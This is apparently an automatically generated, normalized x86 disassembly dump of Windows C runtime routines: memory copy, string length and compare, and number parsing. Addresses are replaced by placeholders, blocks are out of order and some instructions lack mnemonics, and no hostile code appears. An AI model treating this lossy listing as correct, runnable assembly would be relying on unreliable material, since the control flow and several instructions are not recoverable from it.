pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x9
call sub_430d2a
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4330bb
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
push esi
push 0x9
call sub_430d2a
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push esi
call sub_433e16
add esp 0xc
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_42df40
cmp [ ebp - 0x1c ] 0x0
jmp r-xdata
push esi
push eax
call sub_4330e6
pop ecx
pop ecx
or [ ebp - 0x4 ] 0xffffffff
call sub_42df98
cmp [ ebp - 0x24 ] 0x0
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x28 ]
call sub_433e6d
add esp 0xc
jne r-xdata
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
sub_42dfbf
cmp [ esp + 0xc ] 0x0
push ebx
push ebp
push esi
push edi
je r-xdata
xor eax eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x19
call sub_430d2a
dec [ esp + 0x20 ]
mov ebp [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
pop ecx
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push [ esp + 0x1c ]
call sub_434290
add esp 0xc
jmp r-xdata
movzx edi ax
mov al [ edi + rw-data ]
and al 0x10
cmp al 0x10
jne r-xdata
cmp [ esp + 0x1c ] 0x0
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
movzx cx [ ebp ]
movzx eax cl
inc ebp
test [ eax + rw-data ] 0x4
je r-xdata
movzx di [ edi + rw-data ]
mov cl [ edx ]
test cl cl
jne r-xdata
movzx esi [ ebp ]
xor edi edi
test [ esi + rw-data ] 0x4
jne r-xdata
movzx esi cx
mov al [ esi + rw-data ]
and al 0x10
cmp al 0x10
jne r-xdata
cmp [ esp + 0x1c ] 0x0
je r-xdata
xor ebx ebx
inc edx
mov bh al
mov bl cl
mov edi ebx
cmp di [ rw-data ]
jb r-xdata
xor edi edi
jmp r-xdata
push 0x19
call sub_430d8b
pop ecx
jmp r-xdata
cmp di si
jne r-xdata
movzx si [ esi + rw-data ]
xor esi esi
jmp r-xdata
mov al [ ebp ]
dec [ esp + 0x1c ]
test al al
jne r-xdata
cmp di [ rw-data ]
jb r-xdata
cmp di [ rw-data ]
ja r-xdata
push 0x19
call sub_430d8b
cmp si di
pop ecx
sbb eax eax
and eax 0x2
dec eax
jmp r-xdata
test di di
je r-xdata
xor ebx ebx
inc ebp
mov bh cl
mov bl al
mov esi ebx
cmp si [ rw-data ]
jb r-xdata
cmp di [ rw-data ]
ja r-xdata
add edi [ rw-data ]
jmp r-xdata
mov eax [ esp + 0x1c ]
dec [ esp + 0x1c ]
test eax eax
je r-xdata
cmp si [ rw-data ]
jb r-xdata
cmp si [ rw-data ]
ja r-xdata
add edi [ rw-data ]
jmp r-xdata
jmp r-xdata
cmp si [ rw-data ]
ja r-xdata
add esi [ rw-data ]
jmp r-xdata
movzx ax [ edx ]
movzx ecx al
inc edx
test [ ecx + rw-data ] 0x4
je r-xdata
add esi [ rw-data ]
jmp r-xdata
sub_42e162
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_42e1ca
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_42e1e2
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_42e240
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_42e2aa
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x14
mov esi [ ebp + 0x8 ]
mov ecx esi
call [ ebp + 0x14 ]
add esi [ ebp + 0xc ]
mov [ ebp + 0x8 ] esi
inc [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
sub_42e2d0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_42e330 ]
jmp [ ecx * 4 + jump_table_42e3ac ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_42e418 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_42e418 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_42e5b0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_42e4b8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_42e5b0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_42e418 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_42e418 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_42e418 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_42e5b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_42e5b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_42e5b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_42e5b0 ]
sub_42e605
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
call sub_42eea0
mov edi esi
push esi
sub edi eax
call sub_42eea0
pop ecx
add edi eax
pop ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4343a0
pop ecx
pop ecx
jmp r-xdata
xor eax eax
cmp esi edi
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ esi ] bl
mov eax [ ebp + 0xc ]
je r-xdata
cmp [ eax ] bl
je r-xdata
mov edx esi
sub edx eax
mov eax esi
jmp r-xdata
push esi
call sub_42e14b
pop ecx
mov esi eax
jmp r-xdata
cmp [ edx + eax ] cl
jne r-xdata
cmp [ esi ] bl
je r-xdata
inc eax
cmp [ edx + eax ] bl
jne r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
sub_42e686
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x0
lea eax [ ecx + 0x2 ]
je r-xdata
sub eax ecx
sar eax 0x1
dec eax
retn
mov dx [ eax ]
inc eax
inc eax
test dx dx
jne r-xdata
sub_42e6a3
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push ebx
push esi
jne r-xdata
push 0x19
call sub_430d2a
mov esi [ ebp + 0x8 ]
pop ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_434430
pop ecx
pop ecx
jmp r-xdata
push 0x19
call sub_430d8b
mov eax [ ebp + 0xc ]
pop ecx
movzx ecx bx
sub eax ecx
neg eax
sbb eax eax
not eax
and eax esi
movzx eax bl
test [ eax + rw-data ] 0x4
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx eax bx
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
je r-xdata
inc esi
jmp r-xdata
push 0x19
call sub_430d8b
pop ecx
xor eax eax
jmp r-xdata
movzx ecx bx
movzx eax al
shl ecx 0x8
or ecx eax
cmp [ ebp + 0xc ] ecx
je r-xdata
movzx bx [ esi ]
test bx bx
je r-xdata
push 0x19
call sub_430d8b
pop ecx
lea eax [ esi - 0x1 ]
jmp r-xdata
jmp r-xdata
sub_42e73a
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push esi
push 0x19
call sub_430d2a
mov esi [ esp + 0x10 ]
pop ecx
cmp [ esi ] bl
je r-xdata
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_4344f0
pop ecx
pop ecx
pop ebx
retn
push 0x19
call sub_430d8b
mov al [ esi ]
pop ecx
neg al
sbb eax eax
and eax esi
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x14 ]
cmp [ eax ] bl
jne r-xdata
mov cl [ eax ]
movzx edx cl
test [ edx + rw-data ] 0x4
je r-xdata
pop edi
movzx eax [ esi ]
test [ eax + rw-data ] 0x4
je r-xdata
cmp cl [ esi ]
je r-xdata
cmp cl [ esi ]
jne r-xdata
inc esi
cmp [ esi ] bl
jne r-xdata
inc esi
cmp [ esi ] bl
je r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
cmp [ eax + 0x1 ] bl
lea ecx [ eax + 0x1 ]
je r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ esi + 0x1 ]
je r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
mov eax ecx
jmp r-xdata
sub_42e7cf
push ebp
mov ebp esp
push esi
push edi
push 0x19
call sub_430d2a
mov edi [ ebp + 0x8 ]
pop ecx
mov esi edi
cmp [ edi ] 0x0
je r-xdata
push 0x19
call sub_430d8b
pop ecx
mov eax edi
movzx ecx [ esi ]
mov al [ ecx + rw-data ]
test al 0x4
je r-xdata
and al 0x20
cmp al 0x20
jne r-xdata
push 0x1
lea eax [ ebp + 0x8 ]
push [ rw-data ]
push 0x2
push eax
push 0x2
push esi
push 0x200
push [ rw-data ]
call sub_43452a
add esp 0x20
test eax eax
je r-xdata
mov [ esi ] cl
movzx ecx [ ecx + rw-data ]
push 0x19
call sub_430d8b
pop ecx
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp eax 0x1
mov [ esi ] cl
jle r-xdata
pop edi
pop esi
pop ebp
retn
inc esi
cmp [ esi ] 0x0
jne r-xdata
inc esi
mov [ esi ] ch
jmp r-xdata
sub_42e870
push ebp
mov ebp esp
sub esp 0xc
push ebx
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0x8 ]
mov bl [ edi ]
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] esi
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax bl
push 0x8
push eax
call sub_430f15
pop ecx
pop ecx
jmp r-xdata
cmp bl 0x2d
mov [ ebp - 0x4 ] esi
jne r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jl r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
push 0x10
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov edi 0x103
mov [ ebp - 0xc ] eax
cmp bl 0x30
jne r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_430f15
pop ecx
pop ecx
jmp r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] ecx
cmp al 0x58
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
test eax eax
je r-xdata
mov bl [ esi + 0x1 ]
inc esi
inc esi
mov [ ebp - 0x4 ] esi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
mov eax [ rw-data ]
mov ax [ eax + esi * 2 ]
and eax edi
push edi
push esi
call sub_430f15
pop ecx
pop ecx
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
dec [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
test al 0x8
jne r-xdata
movsx eax bl
push eax
call sub_434780
pop ecx
mov ecx eax
sub ecx 0x37
test eax eax
je r-xdata
mov esi [ ebp - 0x8 ]
or [ ebp + 0x14 ] 0x8
cmp esi [ ebp - 0xc ]
jb r-xdata
test al 0x4
mov esi 0x7fffffff
jne r-xdata
test ebx ebx
je r-xdata
imul esi [ ebp + 0x10 ]
add esi ecx
mov [ ebp - 0x8 ] esi
jne r-xdata
call sub_4301d9
test [ ebp + 0x14 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x1
movzx esi bl
jle r-xdata
or [ ebp + 0x14 ] 0x4
jmp r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ecx edx
jbe r-xdata
mov eax [ ebp + 0x14 ]
and al 0x2
neg al
sbb eax eax
neg eax
add eax esi
mov [ ebp - 0x8 ] eax
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
test ebx ebx
je r-xdata
and eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov bl [ eax ]
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
neg eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] esi
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_42ea90
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_42eaf0 ]
jmp [ ecx * 4 + jump_table_42eb6c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_42ebd8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_42ebd8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_42ed70 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_42ec78 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_42ed70 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_42ebd8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_42ebd8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_42ebd8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_42ed70 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_42ed70 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_42ed70 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_42ed70 ]
sub_42edc5
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push edi
push 0x19
call sub_430d2a
pop ecx
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_434940
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp + 0xc ] eax
mov dl [ ecx + 0x1 ]
inc ecx
test dl dl
je r-xdata
pop esi
pop ebp
retn
inc ecx
test dl dl
jne r-xdata
mov esi ecx
test esi esi
jmp r-xdata
movzx edi dl
shl eax 0x8
or eax edi
cmp [ ebp + 0xc ] eax
jne r-xdata
mov dl [ ecx ]
movzx eax dl
movzx edi al
test [ edi + rw-data ] 0x4
je r-xdata
push 0x19
call sub_430d8b
pop ecx
mov eax esi
pop edi
jne r-xdata
lea esi [ ecx - 0x1 ]
jmp r-xdata
sub_42ee37
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_4310a2
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_430f8a
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_42eea0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_42ef1b
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
push esi
push edi
je r-xdata
xor eax eax
cmp [ rw-data ] ebx
jne r-xdata
push 0x19
call sub_430d2a
dec [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
pop ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_434970
add esp 0xc
jmp r-xdata
movzx bx [ esi ]
movzx eax bl
inc esi
test [ eax + rw-data ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0xc ] bx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
movzx eax [ esi ]
mov [ ebp + 0xc ] ebx
test [ eax + rw-data ] 0x4
jne r-xdata
push 0x19
call sub_430d8b
cmp bx [ ebp + 0xc ]
pop ecx
sbb eax eax
and eax 0x2
dec eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov al [ esi ]
dec [ ebp + 0x10 ]
test al al
jne r-xdata
xor edx edx
inc edi
mov dh cl
mov dl al
mov [ ebp + 0xc ] edx
mov [ ebp + 0xc ] ebx
jmp r-xdata
push 0x19
call sub_430d8b
pop ecx
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
dec [ ebp + 0x10 ]
test eax eax
je r-xdata
xor ecx ecx
inc esi
mov ch bl
mov cl al
mov ebx ecx
